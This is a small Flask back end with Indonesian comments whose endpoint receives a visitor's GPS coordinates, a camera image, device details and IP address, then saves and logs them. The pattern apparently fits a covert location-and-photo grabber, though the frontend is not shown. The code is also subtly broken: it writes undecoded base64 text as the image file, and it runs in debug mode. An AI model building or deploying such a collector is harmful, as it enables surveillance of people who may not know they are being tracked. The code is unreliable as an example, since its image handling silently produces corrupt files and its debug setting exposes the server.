from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# Directory untuk menyimpan foto yang diambil
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_data', methods=['POST'])
def submit_data():
    try:
        # Ambil data yang dikirim oleh frontend
        data = request.get_json()

        latitude = data.get('latitude')
        longitude = data.get('longitude')
        image_data = data.get('image')  # Base64 encoded image
        device_info = data.get('deviceInfo')
        device_brand = data.get('deviceBrand')
        ip_address = data.get('ip')

        # Simpan gambar yang dikirim dalam bentuk file
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        image_filename = f"{timestamp}.png"
        image_path = os.path.join(UPLOAD_FOLDER, image_filename)

        # Simpan file gambar dari base64
        with open(image_path, 'wb') as f:
            # Menghapus prefix 'data:image/png;base64,' dari base64
            image_data = image_data.split(',')[1]
            f.write(bytearray(image_data, 'utf-8'))

        # Tulis informasi ke log atau database (disini hanya print)
        print(f"Data diterima:")
        print(f"Latitude: {latitude}, Longitude: {longitude}")
        print(f"Device Info: {device_info}")
        print(f"Device Brand: {device_brand}")
        print(f"IP Address: {ip_address}")
        print(f"Image saved as: {image_filename}")

        # Kembalikan respon sukses
        return jsonify({"message": "Data berhasil diterima dan disimpan!"}), 200

    except Exception as e:
        # Tangani error jika terjadi kesalahan
        print(f"Error: {e}")
        return jsonify({"message": "Terjadi kesalahan saat memproses data!"}), 500

if __name__ == "__main__":
    app.run(debug=True)
